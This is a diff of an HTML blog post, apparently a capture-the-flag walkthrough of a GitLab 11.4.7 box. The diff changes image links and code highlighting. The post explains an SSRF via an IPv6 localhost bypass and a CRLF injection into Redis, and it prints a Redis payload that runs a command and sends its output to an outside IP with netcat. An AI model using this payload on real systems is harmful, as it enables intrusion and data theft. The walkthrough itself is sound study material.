@@ -201,7 +201,7 @@ Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</spa
 
 </code></pre></div><p>From the nmap scan it looks as though only two ports are open. SSH and 5080. 5080 seems to be a webserver running nginx. Looks like it has a GitLab running.</p>
 <p>Initially we needed to register for an account which lets us straight through.</p>
-<p>![[Screenshot 2021-04-25 at 14.54.23.png]]</p>
+<p><img src="/images/ready-login.png" alt="login"></p>
 <p>I found a potential username &ldquo;dude&rdquo; when looking at the public repository.</p>
 <h2 id="version-1147">Version 11.4.7<a href="#version-1147" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>If we go to &ldquo;help&rdquo; we can see the version is 11.4.7. A. quick google search shows this is vulnerable to rce via a ssrf vulnerability.</p>
@@ -308,39 +308,39 @@ r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</spa
 print(<span style="color:#e6db74">&#39;\[+\] Exploit completed successfully!&#39;</span>)
 </code></pre></div><h2 id="what-is-this-attack-doing">What is this attack doing?<a href="#what-is-this-attack-doing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>When creating a new project in gitlab you have the option to import a new project by providing a URL. It does this by using webhooks. This takes in users input and fails to properly sanitise to prevent against calls to internal structures (ssrf).</p>
-<p>![[Screenshot 2021-05-18 at 15.24.37.png]]</p>
+<p><img src="/images/ready-ssrf.png" alt="ssrf"></p>
 <p>We can see some information on webhooks here</p>
-<p>![[Screenshot 2021-05-18 at 15.26.08.png]]</p>
+<p><img src="/images/ready-webhooks.png" alt="webhooks"></p>
 <p>From some research we know webhooks are vulnerable to ssrf in the 11.4.7 release. This can be confirmed in the gitlab changelog here. (It is also plastered everywhere if you google the version number) <a href="https://about.gitlab.com/releases/2018/11/28/security-release-gitlab-11-dot-5-dot-1-released/">https://about.gitlab.com/releases/2018/11/28/security-release-gitlab-11-dot-5-dot-1-released/</a></p>
-<p>![[Screenshot 2021-05-18 at 15.27.35.png]]</p>
+<p><img src="/images/ready-ssrf-in-webhooks.png" alt="ssrf-in-webhooks"></p>
 <p>Gitlab have had issues with ssrf before in the past so they have some mitgations for this. For example, you can&rsquo;t just call localhost on 127.0.0.1. However, you can bypass this check by using an IPv6 address opposed to the traditional IPv4.</p>
-<p>![[Screenshot 2021-05-18 at 15.28.48.png]]</p>
+<p><img src="/images/ready-ssrf-prevention.png" alt="ssrf-prevention"></p>
 <p>We can see in the gitlab documentation, what was changed in version 11.4.8. There are two main points of interest, ssrf and crlf injection. If we take a look at the ssrf source code,we can see the developer has input &ldquo;tests&rdquo; to prevent against the ssrf. This tells us how it was possible to achieve ssrf in the first place, which we can use in our attack against the out of date vulnerable application.</p>
-<p>![[Screenshot 2021-05-18 at 16.36.06.png]]</p>
+<p><img src="/images/read-gitpushes.png" alt="gitPushes"></p>
 <p>Therefore using an IPv6 address vs an IPv4 Should work!</p>
-<p>![[Screenshot 2021-05-18 at 16.33.40.png]]
+<p><img src="/images/ready-gitlabSource.png" alt="GitlabSource">
 So if we try and hit localhost with an IPv6 address do we still get the error?</p>
-<p>![[Screenshot 2021-05-18 at 15.31.53.png]]</p>
+<p><img src="/images/ready-successfulSSRF.png" alt="SuccessfulSSRF"></p>
 <p>No we don&rsquo;t! SSRF is do able.</p>
 <h2 id="targeting-redis">Targeting redis<a href="#targeting-redis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>From further reseaerch i discovered the way to get code execution is to exploit the crlf (new line injection) vulnerabiltiy we saw earlier in the documentation with redis.</p>
 <p>Redis is a &ldquo;in memory based data structure store, used as a database&rdquo; It uses Key: Value pairs to store data and it is used with gitlab. Redis uses a simple ascii line based protocol to recieve commands. Sounds a lot like HTTP. That means it uses http commands, like GET. If we can send a GET request to the internal redis server then we could get code execution.</p>
 <p>Okay so lets try play about with redis.</p>
-<p>![[Screenshot 2021-05-18 at 16.01.15.png]]</p>
+<p><img src="/images/ready-redisTest.png" alt="testingRedis"></p>
 <p>So we can send a GET request, but everytime we specify the &ldquo;Host&rdquo; header, the connection is dropped. This is because ssrf to redis is such a problem, they implemented a &ldquo;fix&rdquo; to drop everytime it sees the Host header.</p>
 <p>If we were able to get our payload in front of the Host header then this might work.</p>
 <p>We are using the http protocol at the moment, but gitlab allows us to use git. Lets see how the git protocol perfroms a request.</p>
-<p>![[Screenshot 2021-05-18 at 16.06.45.png]]</p>
+<p><img src="/images/ready-gitnewlineinjection.png" alt="usingGitforNewlineInjection"></p>
 <p>So from that test we can see we can control the data in front of the &ldquo;Host:&rdquo; header if we use the git protocol.</p>
 <h2 id="code-execution">Code execution<a href="#code-execution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Since this has happened before with gitlab i found this great. writeup that explains how we can get code execution.</p>
 <p><a href="https://gitlab.com/gitlab-org/gitlab-foss/-/issues/41293">Command Injection vulnerability on system_hook_push queue through web hook (#41293) · Issues · GitLab.org / GitLab FOSS · GitLab</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">
 multi
  
-sadd resque:gitlab:queues system<span style="color:#ae81ff">\_</span>hook<span style="color:#ae81ff">\_</span>push
+sadd <span style="color:#e6db74">resque</span>:<span style="color:#e6db74">gitlab</span>:queues system\_hook\_push
 
-lpush resque:gitlab:queue:system<span style="color:#ae81ff">\_</span>hook<span style="color:#ae81ff">\_</span>push <span style="color:#e6db74">&#34;{\\&#34;</span>class<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;:\\&#34;</span>GitlabShellWorker<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;,\\&#34;</span>args<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;:\[\\&#34;</span>class<span style="color:#ae81ff">\_</span>eval<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;,\\&#34;</span>open<span style="color:#f92672">(</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;|whoami | nc 192.241.233.143 80\\&#39;</span><span style="color:#f92672">)</span>.read<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;\],\\&#34;</span>retry<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;:3,\\&#34;</span>queue<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;:\\&#34;</span>system<span style="color:#ae81ff">\_</span>hook<span style="color:#ae81ff">\_</span>push<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;,\\&#34;</span>jid<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;:\\&#34;</span>ad52abc5641173e217eb2e52<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;,\\&#34;</span>created<span style="color:#ae81ff">\_</span>at<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;:1513714403.8122594,\\&#34;</span>enqueued<span style="color:#ae81ff">\_</span>at<span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;:1513714403.8129568}&#34;</span>
+lpush <span style="color:#e6db74">resque</span>:<span style="color:#e6db74">gitlab</span>:<span style="color:#e6db74">queue</span>:system\_hook\_push <span style="color:#e6db74">&#34;{</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>class\\<span style="color:#e6db74">&#34;:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">GitlabShellWorker</span>\\<span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>args\\<span style="color:#e6db74">&#34;:\[</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>class\_eval\\<span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>open(\\<span style="color:#e6db74">&#39;|whoami | nc 192.241.233.143 80\\&#39;</span>)<span style="color:#f92672">.</span>read\\<span style="color:#e6db74">&#34;\],</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">retry</span>\\<span style="color:#e6db74">&#34;:3,</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>queue\\<span style="color:#e6db74">&#34;:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>system\_hook\_push\\<span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>jid\\<span style="color:#e6db74">&#34;:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>ad52abc5641173e217eb2e52\\<span style="color:#e6db74">&#34;,</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>created\_at\\<span style="color:#e6db74">&#34;:1513714403.8122594,</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>enqueued\_at\\<span style="color:#e6db74">&#34;:1513714403.8129568}&#34;</span>
  
 exec
 exec
@@ -348,7 +348,7 @@ exec
 </code></pre></div><p>What it is doing is using a &ldquo;system hook push&rdquo; to initiate a &ldquo;Gitlab Shell Worker&rdquo; to eventually execute our command.</p>
 <p>A system hook is just a way of posting data to redis.</p>
 <p>The gitlab shell worker is a class in ruby that allows the user to specify an argument. In our instance the argument is &ldquo;class_eval&rdquo; which is passed some ruby code &ldquo;nc 192.241.233.143 80\').read&rdquo; and sent back to the attacker via netcat.</p>
-<p>![[Screenshot 2021-05-18 at 16.50.25.png]]</p>
+<p><img src="/images/ready-ruby.png" alt="ruby"></p>
 <h2 id="prvilege-escalation">Prvilege escalation<a href="#prvilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>From running linpeas we can see there are a few files it has flagged of interest. Some files are readable by root and me but not world readable&hellip;</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/var/opt/gitlab/gitlab-rails/etc/secrets.yml
